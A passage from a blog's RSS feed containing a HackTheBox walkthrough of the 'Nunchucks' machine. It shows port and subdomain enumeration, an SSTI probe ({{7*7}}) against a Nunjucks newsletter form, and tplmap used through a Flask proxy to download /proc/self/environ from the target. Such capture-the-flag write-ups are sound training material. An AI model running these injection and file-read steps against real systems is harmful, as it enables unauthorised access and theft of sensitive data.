<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>SSTI on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/ssti/</link>
    <description>Recent content in SSTI on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Sun, 07 Nov 2021 01:42:05 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/ssti/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Nunchucks</title>
      <link>https://fahmifj.github.io/hackthebox/nunchucks/</link>
      <pubDate>Sun, 07 Nov 2021 01:42:05 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/nunchucks/</guid>
      <description>SSTI in Nunjucks and SUID capability on Perl</description>
      <content:encoded><![CDATA[<p>Nunchucks features a NodeJS website that uses <a href="https://mozilla.github.io/nunjucks/">Nunjucks</a> as its templating engine. Fuzzing for the hostname reveals another website that is vulnerable to SSTI, which can be exploited to gain initial access to the system. Further enumeration reveals that the Perl binary has the <code>cap_setuid</code> capability set, and this eventually allows me to escalate myself to root.</p>
<p>I really enjoyed the foothold part of this box, so that section might be a bit longer.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Web enumeration</li>
<li>SSTI on Nunjucks</li>
<li>Creating tplmap middleware using Flask</li>
<li>Exploiting <code>cap_setuid</code> on Perl</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Tplmap</li>
<li>Flask</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>Full TCP scan with <code>nmap</code> reveals 3 open ports: SSH on its default, HTTP and its secure version, HTTPS.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «nunchucks» «10.10.14.46» 
</span></span><span class="line"><span class="cl">$ fscan 10.10.11.122 nunchucks
</span></span><span class="line"><span class="cl">nmap -p- 10.10.11.122 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
</span></span><span class="line"><span class="cl">nmap -p 22,80,443 -sC -sV -oA nmap/all-tcp-ports-nunchucks 10.10.11.122
</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-11-05 07:12 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.122
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.14s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT    STATE SERVICE  VERSION
</span></span><span class="line"><span class="cl">22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 <span class="o">(</span>RSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 <span class="o">(</span>ECDSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 <span class="o">(</span>ED25519<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp  open  http     nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to https://nunchucks.htb/
</span></span><span class="line"><span class="cl">443/tcp open  ssl/http nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Nunchucks - Landing Page
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>nunchucks.htb/organizationName<span class="o">=</span>Nunchucks-Certificates/stateOrProvinceName<span class="o">=</span>Dorset/countryName<span class="o">=</span>UK
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-08-30T15:42:24
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2031-08-28T15:42:24
</span></span><span class="line"><span class="cl"><span class="p">|</span> tls-alpn: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  http/1.1
</span></span><span class="line"><span class="cl"><span class="p">|</span> tls-nextprotoneg: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  http/1.1
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 16.77 seconds
</span></span></code></pre></div><p>I&rsquo;ll update my <code>/etc/hosts</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «nunchucks» «10.10.14.46» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;10.10.11.122 nunchucks.htb&#39;</span> <span class="p">|</span> sudo tee -a /etc/hosts
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="http---https">HTTP -&gt; HTTPS</h3>
<p>For HTTP, nothing interesting in the server response, it has permanent redirection to HTTPS.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «nunchucks» «10.10.14.46» 
</span></span><span class="line"><span class="cl">$ curl -I http://nunchucks.htb/ 
</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">301</span> Moved Permanently
</span></span><span class="line"><span class="cl">Server: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl">Date: Fri, <span class="m">05</span> Nov <span class="m">2021</span> 11:51:32 GMT
</span></span><span class="line"><span class="cl">Content-Type: text/html
</span></span><span class="line"><span class="cl">Content-Length: <span class="m">178</span>
</span></span><span class="line"><span class="cl">Connection: keep-alive
</span></span><span class="line"><span class="cl">Location: https://nunchucks.htb/
</span></span></code></pre></div><h3 id="nunchuckshtb">nunchucks.htb</h3>
<p>On the HTTPS, it&rsquo;s a company site called Nunchucks that offers online shop creation.</p>
<p><div class="img-container"><img src="imgs/image-20211105185410047.png" alt="image-20211105185410047"  /></div>
</p>
<p>At the bottom of the page, there is an email, also it says it will have a store soon.</p>
<p><div class="img-container"><img src="imgs/image-20211105190058511.png" alt="image-20211105190058511"  /></div>
</p>
<p>Opening Wappalyzer reveals it&rsquo;s using Node.js and PHP. I doubt it&rsquo;s PHP since appending <code>.php</code> gives me a 404 error.</p>
<p><div class="img-container"><img src="imgs/image-20211105185340514.png" alt="image-20211105185340514"  /></div>
</p>
<p>The signup button sends me to <code>/signup</code> where a signup form is shown. I will just signup and intercept the request.</p>
<p><div class="img-container"><img src="imgs/image-20211105185906028.png" alt="image-20211105185906028"  /></div>
</p>
<p>I&rsquo;ll send this request to repeater just in case, and then forward it</p>
<p><div class="img-container"><img src="imgs/image-20211105185921036.png" alt="image-20211105185921036"  /></div>
</p>
<p>But then, the returned response states that registration is closed</p>
<p><div class="img-container"><img src="imgs/image-20211105190014496.png" alt="image-20211105190014496"  /></div>
</p>
<p>I changed the endpoint to <code>/api/login</code>, and it returns the same.</p>
<p><div class="img-container"><img src="imgs/image-20211105190246106.png" alt="image-20211105190246106"  /></div>
</p>
<p>Sending a malformed input breaks the parser and leaks the web directory.</p>
<p><div class="img-container"><img src="imgs/image-20211105190735552.png" alt="image-20211105190735552"  /></div>
</p>
<p>Nothing else to try here.</p>
<h3 id="subdomain-fuzz">Subdomain Fuzz</h3>
<p>Fuzzing the Host header reveals a subdomain: <code>store.nunchucks.htb</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «nunchucks» «10.10.14.46» 
</span></span><span class="line"><span class="cl">$ ffuf -k -u https://nunchucks.htb -H <span class="s2">&#34;Host: FUZZ.nunchucks.htb&#34;</span> -mc <span class="m">200</span> -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fl <span class="m">547</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="err">&#39;</span>___<span class="se">\ </span>      
</span></span><span class="line"><span class="cl">       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/       
</span></span><span class="line"><span class="cl">       <span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\ </span>     
</span></span><span class="line"><span class="cl">        <span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/      
</span></span><span class="line"><span class="cl">         <span class="se">\ \_\ </span>  <span class="se">\ \_\ </span> <span class="se">\ \_</span>___/  <span class="se">\ \_\ </span>      
</span></span><span class="line"><span class="cl">          <span class="se">\/</span>_/    <span class="se">\/</span>_/   <span class="se">\/</span>___/    <span class="se">\/</span>_/       
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">       v1.3.0-dev
</span></span><span class="line"><span class="cl">________________________________________________
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> :: Method           : GET
</span></span><span class="line"><span class="cl"> :: URL              : https://nunchucks.htb
</span></span><span class="line"><span class="cl"> :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
</span></span><span class="line"><span class="cl"> :: Header           : Host: FUZZ.nunchucks.htb
</span></span><span class="line"><span class="cl"> :: Follow redirects : <span class="nb">false</span>
</span></span><span class="line"><span class="cl"> :: Calibration      : <span class="nb">false</span>
</span></span><span class="line"><span class="cl"> :: Timeout          : <span class="m">10</span>
</span></span><span class="line"><span class="cl"> :: Threads          : <span class="m">40</span>
</span></span><span class="line"><span class="cl"> :: Matcher          : Response status: <span class="m">200</span>
</span></span><span class="line"><span class="cl"> :: Filter           : Response lines: <span class="m">547</span>
</span></span><span class="line"><span class="cl">________________________________________________
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">store                   <span class="o">[</span>Status: 200, Size: 4028, Words: 1053, Lines: 102<span class="o">]</span>
</span></span><span class="line"><span class="cl">:: Progress: <span class="o">[</span>4989/4989<span class="o">]</span> :: Job <span class="o">[</span>1/1<span class="o">]</span> :: <span class="m">269</span> req/sec :: Duration: <span class="o">[</span>0:00:22<span class="o">]</span> :: Errors: <span class="m">0</span> ::
</span></span></code></pre></div><p>I&rsquo;ll update my <code>/etc/hosts</code> again.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «nunchucks» «10.10.14.46» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;10.10.11.122 store.nunchucks.htb&#39;</span> <span class="p">|</span> sudo tee -a /etc/hosts
</span></span></code></pre></div><h3 id="storenunchuckshtb">store.nunchucks.htb</h3>
<p>Store is not available, but I can subscribe for newsletter.</p>
<p><div class="img-container"><img src="imgs/image-20211105191702728.png" alt="image-20211105191702728"  /></div>
</p>
<p>When I submit an email address there, it reflects the address back.</p>
<p><div class="img-container"><img src="imgs/image-20211105191708337.png" alt="image-20211105191708337"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="ssti">SSTI</h3>
<h4 id="identify">Identify</h4>
<p>Since I&rsquo;ve got a spoiler from the machine tags and the machine name, I immediately sent the typical <code>{{7*7}}</code> SSTI payload, and <code>49</code> returned in the email address. This means the site is vulnerable.</p>
<p><div class="img-container"><img src="imgs/image-20211105191824204.png" alt="image-20211105191824204"  /></div>
</p>
<blockquote>
<p>The email validation is on client-side.</p>
</blockquote>
<h4 id="creating-middleware-for-tplmap-with-flask">Creating Middleware for tplmap with Flask</h4>
<p>The machine name gives a big spoiler about which templating engine this machine uses (Nunjucks), and there is a nice writeup that shows how to exploit it <a href="http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine.">here</a>. But, I&rsquo;d like to let <code>tplmap</code> identify it for me.</p>
<p>Unfortunately, there is no such option in <code>tplmap</code> for sending a request in JSON format. Therefore, I created a simple middleware using Flask which acts as a middleman/proxy that will takes the non-JSON request and convert it before forwarding the request to <code>store.nunchucks.htb</code>. Here&rsquo;s the code:</p>
<script type="application/javascript" src="https://gist.github.com/fahmifj/fad39893ee4ec8636baba2903aee7814.js"></script>

<blockquote>
<p>If you&rsquo;re having trouble with tplmap, maybe this post <a href="https://fahmifj.github.io/blog/tplmap-install/">here</a> could resolve it.</p>
</blockquote>
<p>I&rsquo;ll run the middleware.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.46»
</span></span><span class="line"><span class="cl">$ python3 middleware.py
</span></span><span class="line"><span class="cl"> * Serving Flask app <span class="s2">&#34;middleware&#34;</span> <span class="o">(</span>lazy loading<span class="o">)</span>
</span></span><span class="line"><span class="cl"> * Environment: production
</span></span><span class="line"><span class="cl">   WARNING: This is a development server. Do not use it in a production deployment.
</span></span><span class="line"><span class="cl">   Use a production WSGI server instead.
</span></span><span class="line"><span class="cl"> * Debug mode: off
</span></span><span class="line"><span class="cl"> * Running on http://0.0.0.0:80/ <span class="o">(</span>Press CTRL+C to quit<span class="o">)</span>
</span></span></code></pre></div><p>Then I will point <code>tplmap</code> to the middleware.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>tplmap-venv<span class="o">)</span> → kali@kali «tplmap» «10.10.14.46»
</span></span><span class="line"><span class="cl">$ ./tplmap.py -u <span class="s1">&#39;http://127.0.0.1/?email=0mochi@iamf.htb&#39;</span>
</span></span></code></pre></div><p>Now I&rsquo;ll just wait for it to finish, and here&rsquo;s the image of how it went.</p>
<p><div class="img-container"><img src="imgs/image-20211105213721440.png" alt="image-20211105213721440"  /></div>
</p>
<p>After a few sec later, <code>tplmap</code> finally got it right.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>tplmap-venv<span class="o">)</span> → kali@kali «tplmap» «10.10.14.46» git:<span class="o">(</span>master<span class="o">)</span> 
</span></span><span class="line"><span class="cl">$ ./tplmap.py -u <span class="s1">&#39;http://127.0.0.1/?email=0mochi@iamf.htb&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Tplmap 0.5
</span></span><span class="line"><span class="cl">    Automatic Server-Side Template Injection Detection and Exploitation Tool
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Testing <span class="k">if</span> GET parameter <span class="s1">&#39;email&#39;</span> is injectable
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Nunjucks plugin is testing rendering with tag <span class="s1">&#39;{{*}}&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Nunjucks plugin has confirmed injection with tag <span class="s1">&#39;{{*}}&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Tplmap identified the following injection point:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  GET parameter: email
</span></span><span class="line"><span class="cl">  Engine: Nunjucks
</span></span><span class="line"><span class="cl">  Injection: <span class="o">{{</span>*<span class="o">}}</span>
</span></span><span class="line"><span class="cl">  Context: text
</span></span><span class="line"><span class="cl">  OS: linux
</span></span><span class="line"><span class="cl">  Technique: render
</span></span><span class="line"><span class="cl">  Capabilities:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Shell <span class="nb">command</span> execution: no
</span></span><span class="line"><span class="cl">   Bind and reverse shell: no
</span></span><span class="line"><span class="cl">   File write: ok
</span></span><span class="line"><span class="cl">   File read: ok
</span></span><span class="line"><span class="cl">   Code evaluation: ok, javascript code
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Rerun tplmap providing one of the following options:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    --upload LOCAL REMOTE       Upload files to the server
</span></span><span class="line"><span class="cl">    --download REMOTE LOCAL     Download remote files
</span></span></code></pre></div><p>Based on the <code>tplmap</code> results, it seems that command execution is not possible.</p>
<h4 id="grabbing-the-flag">Grabbing The Flag</h4>
<p>With the file read ability, the first file I want to grab isn&rsquo;t <code>/etc/passwd</code>, but <code>/proc/self/environ</code>, which most likely to reveal some sensitive information.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>tplmap-venv<span class="o">)</span> → kali@kali «tplmap» «10.10.14.46» git:<span class="o">(</span>master<span class="o">)</span> 
</span></span><span class="line"><span class="cl">$ ./tplmap.py -u <span class="s1">&#39;http://127.0.0.1/?email=0mochi@iamf.htb&#39;</span> --engine Nunjucks --download <span class="s1">&#39;/proc/self/environ&#39;</span> <span class="s1">&#39;loot/dl_environ&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Tplmap 0.5
</span></span><span class="line"><span class="cl">    Automatic Server-Side Template Injection Detection and Exploitation Tool
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Testing <span class="k">if</span> GET parameter <span class="s1">&#39;email&#39;</span> is injectable
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Nunjucks plugin is testing rendering with tag <span class="s1">&#39;{{*}}&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Nunjucks plugin has confirmed injection with tag <span class="s1">&#39;{{*}}&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Tplmap identified the following injection point:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  GET parameter: email
</span></span><span class="line"><span class="cl">  Engine: Nunjucks
</span></span><span class="line"><span class="cl">  Injection: <span class="o">{{</span>*<span class="o">}}</span>
</span></span><span class="line"><span class="cl">  Context: text
</span></span><span class="line"><span class="cl">  OS: linux
</span></span><span class="line"><span class="cl">  Technique: render
</span></span><span class="line"><span class="cl">  Capabilities:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Shell <span class="nb">command</span> execution: no
</span></span><span class="line"><span class="cl">   Bind and reverse shell: no
</span></span><span class="line"><span class="cl">   File write: ok
</span></span><span class="line"><span class="cl">   File read: ok
</span></span><span class="line"><span class="cl">   Code evaluation: ok, javascript code
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">][</span>plugin<span class="o">]</span> Remote file md5 mismatch, check manually
</span></span></code></pre></div><p>Even though the tool showed md5 mismatch, I can still read the file contents. This file reveals that the app is running as user <code>david</code> under <code>/var/www/store.nunchucks</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «tplmap» «10.10.14.46» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
</span></span><span class="line"><span class="cl">$ cat loot/dl_environ <span class="p">|</span> tr <span class="s1">&#39;,&#39;</span> <span class="s1">&#39;\n&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nv">LANG</span><span class="o">=</span>en_GB.UTF-8PATH<span class="o">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/usr/bin:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/binPIDFILE<span class="o">=</span>/home/david/.pm2/pm2.pidHOME<span class="o">=</span>/home/davidLOGNAME<span class="o">=</span><span class="nv">davidUSER</span><span class="o">=</span><span class="nv">davidSHELL</span><span class="o">=</span>/bin/bashINVOCATION_ID<span class="o">=</span><span class="nv">c56bdde5ecfc4ab2800ce66c625918d4JOURNAL_STREAM</span><span class="o">=</span>9:34693PM2_USAGE<span class="o">=</span><span class="nv">CLIPM2_HOME</span><span class="o">=</span>/home/david/.pm2SILENT<span class="o">=</span><span class="nv">truewindowsHide</span><span class="o">=</span><span class="nv">truepm2_env</span><span class="o">={</span><span class="s2">&#34;kill_retry_time&#34;</span>:100
</span></span><span class="line"><span class="cl"><span class="s2">&#34;windowsHide&#34;</span>:true
</span></span><span class="line"><span class="cl"><span class="s2">&#34;username&#34;</span>:<span class="s2">&#34;david&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;treekill&#34;</span>:true
</span></span><span class="line"><span class="cl"><span class="s2">&#34;automation&#34;</span>:true
</span></span><span class="line"><span class="cl"><span class="s2">&#34;pmx&#34;</span>:true
</span></span><span class="line"><span class="cl"><span class="s2">&#34;instance_var&#34;</span>:<span class="s2">&#34;NODE_APP_INSTANCE&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;watch&#34;</span>:false
</span></span><span class="line"><span class="cl"><span class="s2">&#34;autorestart&#34;</span>:true
</span></span><span class="line"><span class="cl"><span class="s2">&#34;vizion&#34;</span>:true
</span></span><span class="line"><span class="cl"><span class="s2">&#34;env&#34;</span>:<span class="o">{</span><span class="s2">&#34;PM2_USAGE&#34;</span>:<span class="s2">&#34;CLI&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;OLDPWD&#34;</span>:<span class="s2">&#34;/var/www&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;_&#34;</span>:<span class="s2">&#34;/usr/local/bin/pm2&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;MAIL&#34;</span>:<span class="s2">&#34;/var/mail/david&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;DBUS_SESSION_BUS_ADDRESS&#34;</span>:<span class="s2">&#34;unix:path=/run/user/1000/bus&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;PATH&#34;</span>:<span class="s2">&#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;HUSHLOGIN&#34;</span>:<span class="s2">&#34;FALSE&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;JOURNAL_STREAM&#34;</span>:<span class="s2">&#34;9:35778&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;XDG_RUNTIME_DIR&#34;</span>:<span class="s2">&#34;/run/user/1000&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;XDG_SESSION_ID&#34;</span>:<span class="s2">&#34;1&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;XDG_VTNR&#34;</span>:<span class="s2">&#34;1&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;SHLVL&#34;</span>:<span class="s2">&#34;1&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;USER&#34;</span>:<span class="s2">&#34;david&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;LESSOPEN&#34;</span>:<span class="s2">&#34;| /usr/bin/lesspipe %s&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;TERM&#34;</span>:<span class="s2">&#34;linux&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;XDG_SESSION_CLASS&#34;</span>:<span class="s2">&#34;user&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;LESSCLOSE&#34;</span>:<span class="s2">&#34;/usr/bin/lesspipe %s %s&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;INVOCATION_ID&#34;</span>:<span class="s2">&#34;d8a8bc4baeb140c685790fc6e1974718&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;LS_COLORS&#34;</span>:<span class="s2">&#34;rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;LANG&#34;</span>:<span class="s2">&#34;en_GB.UTF-8&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;HOME&#34;</span>:<span class="s2">&#34;/home/david&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;MOTD_SHOWN&#34;</span>:<span class="s2">&#34;pam&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;XDG_SESSION_TYPE&#34;</span>:<span class="s2">&#34;tty&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;LOGNAME&#34;</span>:<span class="s2">&#34;david&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;PWD&#34;</span>:<span class="s2">&#34;/var/www/store.nunchucks&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;XDG_SEAT&#34;</span>:<span class="s2">&#34;seat0&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;SHELL&#34;</span>:<span class="s2">&#34;/bin/bash&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;PM2_HOME&#34;</span>:<span class="s2">&#34;/home/david/.pm2&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;server&#34;</span>:<span class="o">{}</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;unique_id&#34;</span>:<span class="s2">&#34;cc712ea0-c7b6-40af-9a85-94d9a4fee31a&#34;</span><span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;namespace&#34;</span>:<span class="s2">&#34;default&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;filter_env&#34;</span>:<span class="o">[]</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;server&#34;</span>
